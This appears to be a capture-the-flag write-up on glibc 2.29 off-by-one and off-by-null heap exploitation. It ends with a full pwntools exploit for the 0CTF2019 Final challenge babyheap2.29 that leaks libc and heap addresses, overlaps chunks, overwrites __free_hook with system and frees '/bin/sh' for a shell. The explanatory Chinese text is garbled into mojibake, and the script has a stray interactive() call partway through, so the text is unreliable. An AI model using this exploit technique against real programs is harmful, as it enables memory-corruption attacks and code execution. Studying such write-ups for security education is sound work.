---
clayout: post
title:  "glibc2.29-off by one"
date:   2020-2-19
desc: ""
keywords: ""
categories: [Binary]
tags: [pwn]
icon: icon-html
---

#glibc2.29-off by one

## glibc2.29 unlink

```c
/* consolidate backward */
if (!prev_inuse(p)) {
  prevsize = prev_size (p);
  size += prevsize;
  p = chunk_at_offset(p, -((long) prevsize));
  if (__glibc_unlikely (chunksize(p) != prevsize))
    malloc_printerr ("corrupted size vs. prev_size while consolidating");
  unlink_chunk (av, p);
}
```
ç›¸æ¯”2.27ï¼Œæ–°å¢

```c
  if (__glibc_unlikely (chunksize(p) != prevsize))
    malloc_printerr ("corrupted size vs. prev_size while consolidating");
```

åœ¨2.27ä¸­ï¼Œoff by nullæœ‰ä¸€ç§overlappingæ–¹æ³•

1. malloc A B Cï¼ŒfreeAï¼ŒAè¿›unsorted bin
2. åœ¨Bä¸­ä¼ªé€ Cçš„prev_sizeï¼Œoff by nullè¦†ç›–Cçš„prev_inuse
3. free Cï¼ŒAã€Bã€C unlink
4. mallocï¼ŒæŠŠAã€Bã€Cå–å›æ¥ï¼Œä¹‹å‰çš„Bå¹¶æ²¡æœ‰freeï¼Œå°±å¾—åˆ°äº†ä¸¤ä¸ªB

åœ¨ç¬¬ä¸‰æ­¥ï¼Œæ ¹æ®Cçš„prev_sizeæ‰¾åˆ°Aï¼Œç„¶åç›´æ¥unlink

åœ¨2.29ä¸­ï¼Œæ–°å¢äº†å¯¹sizeçš„æ£€æŸ¥ï¼Œç¬¬ä¸‰æ­¥ï¼Œæ ¹æ®Cçš„prev_sizeæ‰¾åˆ°Aï¼Œç„¶åæ£€æŸ¥Açš„sizeå’Œprev_sizeæ˜¯å¦ç›¸ç­‰ï¼Œä¸ç›¸ç­‰ç›´æ¥ggï¼Œå¦‚æœğŸ‘´æƒ³åƒ2.27ä¸€æ ·overlappingï¼ŒğŸ‘´è¿˜éœ€è¦å»ä¼ªé€ Açš„size

## è§£å†³æ–¹æ¡ˆ

### off by one

ä¼—æ‰€å‘¨çŸ¥off by oneæ¯”off by nullç™½ç»™ï¼Œå¦‚æœæ˜¯off by oneï¼ŒğŸ‘´å°±èƒ½åœ¨Aå‰é¢çš„chunkä¸­off by oneæ”¹Açš„size

1. malloc X A B Cï¼ŒfreeAï¼ŒAè¿›unsorted bin
2. åœ¨Xä¸­off by oneæ”¹Asize
3. åœ¨Bä¸­ä¼ªé€ Cçš„prev_sizeï¼Œoff by oneæŠŠC prev_inuseæ”¹æˆ0
4. free Cï¼ŒAã€Bã€C unlink
5. mallocï¼ŒæŠŠAã€Bã€Cå–å›æ¥ï¼Œå¾—åˆ°ä¸¤ä¸ªB

### off by null

ä¼ªé€ ä¸€ä¸ªunsorted binï¼Œå†ä¼ªé€ prev_sizeï¼Œunlinkæ—¶æ ¹æ®prev_sizeæ‰¾åˆ°ä¼ªé€ çš„chunkï¼Œè¿‡check

ä¼ªé€ unsorted binæ—¶fdå’ŒbkæŒ‡å‘è‡ªå·±ï¼Œfd->bk = bk->fdï¼Œè¿™ç§æ–¹æ³•éœ€è¦å †åœ°å€ç™½ç»™

1. malloc A B C
2. åœ¨Aä¸­ä¼ªé€ fake chunkï¼Œsizeå’Œå°†è¦ä¼ªé€ çš„prev_sizeç›¸åŒï¼Œfdå’Œbkéƒ½æŒ‡å‘è‡ªå·±
3. åœ¨Bä¸­ä¼ªé€ Cçš„prev_sizeï¼Œoff by oneæŠŠC prev_inuseæ”¹æˆ0
4. free Cï¼Œfake chunkã€Bã€C unlink
5. mallocï¼ŒæŠŠfake chunkã€Bã€C å–å›æ¥ï¼Œå¾—åˆ°ä¸¤ä¸ªB

#### 0CTF2019 Final babyheap2.29

editå­˜åœ¨off by null

addå’Œeditåˆ†å¼€ï¼Œå¯ä»¥add free add showæ³„éœ²heapå’Œlibc

ä¼ªé€ 

```c
pwndbg> x/128gx 0x555555559f50
0x555555559f50:	0x0000000000000000	0x0000000000000101//10
0x555555559f60:	0x0000000000000000	0x00000000000001f1//fake
0x555555559f70:	0x0000555555559f60	0x0000555555559f60//fake_fd fake_bk
0x555555559f80:	0x0000000000000000	0x0000000000000000
0x555555559f90:	0x0000000000000000	0x0000000000000000
0x555555559fa0:	0x0000000000000000	0x0000000000000000
0x555555559fb0:	0x0000000000000000	0x0000000000000000
0x555555559fc0:	0x0000000000000000	0x0000000000000000
0x555555559fd0:	0x0000000000000000	0x0000000000000000
0x555555559fe0:	0x0000000000000000	0x0000000000000000
0x555555559ff0:	0x0000000000000000	0x0000000000000000
0x55555555a000:	0x0000000000000000	0x0000000000000000
0x55555555a010:	0x0000000000000000	0x0000000000000000
0x55555555a020:	0x0000000000000000	0x0000000000000000
0x55555555a030:	0x0000000000000000	0x0000000000000000
0x55555555a040:	0x0000000000000000	0x0000000000000000
0x55555555a050:	0x0000000000000000	0x0000000000000101//11
0x55555555a060:	0x6161616161616161	0x6161616161616161
0x55555555a070:	0x6161616161616161	0x6161616161616161
0x55555555a080:	0x6161616161616161	0x6161616161616161
0x55555555a090:	0x6161616161616161	0x6161616161616161
0x55555555a0a0:	0x6161616161616161	0x6161616161616161
0x55555555a0b0:	0x6161616161616161	0x6161616161616161
0x55555555a0c0:	0x6161616161616161	0x6161616161616161
0x55555555a0d0:	0x6161616161616161	0x6161616161616161
0x55555555a0e0:	0x6161616161616161	0x6161616161616161
0x55555555a0f0:	0x6161616161616161	0x6161616161616161
0x55555555a100:	0x6161616161616161	0x6161616161616161
0x55555555a110:	0x6161616161616161	0x6161616161616161
0x55555555a120:	0x6161616161616161	0x6161616161616161
0x55555555a130:	0x6161616161616161	0x6161616161616161
0x55555555a140:	0x6161616161616161	0x6161616161616161
0x55555555a150:	0x00000000000001f0	0x0000000000000100//12
0x55555555a160:	0x0000000000000000	0x0000000000000000
0x55555555a170:	0x0000000000000000	0x0000000000000000
0x55555555a180:	0x0000000000000000	0x0000000000000000
0x55555555a190:	0x0000000000000000	0x0000000000000000
//0x55555555a150 - 0x1f0 = 0x555555559f60
```

overlappingï¼Œuafï¼Œæ”¹fdæ‰“free_hook

```python
from pwn import *

r = process('./babyheap2.29')
elf = ELF('./babyheap2.29')
libc = ELF('libc-2.29.so')

def add(size):
    r.sendlineafter('Command: ','1')
    r.sendlineafter('Size: ',str(size))

def edit(index,content):
    r.sendlineafter('Command: ','2')
    r.sendlineafter('Index: ',str(index))
    r.sendlineafter('Size: ',str(len(content)))
    r.sendafter('Content: ',content)

def free(index):
    r.sendlineafter('Command: ','3')
    r.sendlineafter('Index: ',str(index))

def show(index):
    r.sendlineafter('Command: ','4')
    r.sendlineafter('Index: ',str(index))


add(0x500)
add(0x40)
free(0)
add(0x500)
show(0)
r.recvuntil(']: ')
leak = u64(r.recvuntil('\n',drop=True).ljust(8, '\x00'))
libc_base = leak - 0x1e4ca0
log.success(hex(libc_base))

add(0x40)
add(0x40)
free(1)
free(2)
add(0x40)#1
show(1)
r.recvuntil(']: ')
heap_base = u64(r.recvuntil('\n',drop=True).ljust(8, '\x00'))-0x770
log.success(hex(heap_base))


for i in range(13):
  add(0xf8)

free(2)
for i in range(4,10):
  free(i)


edit(11,'a'*0xf0 + p64(0x1f0))

fake = p64(0x0)+p64(0x1f1)+p64(heap_base+0xf60)+p64(heap_base+0xf60)
edit(10,fake)
r.interactive()

free(12)
add(0xe8)
for i in range(7):
    add(0xf8)
    log.info(r.recvline())
free(1)
add(0xf8)#1


free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

log.success(hex(free_hook))
free(4)
free(5)
free(6)

free(11)
edit(1,p64(free_hook))
add(0xf8)
add(0xf8)#5
log.info(r.recvline())
edit(5,p64(system))
edit(7,'/bin/sh\x00')
free(7)
r.interactive()

```



### æ— å †åœ°å€off by null

large binæ®‹ç•™æŒ‡é’ˆ+heap fengshui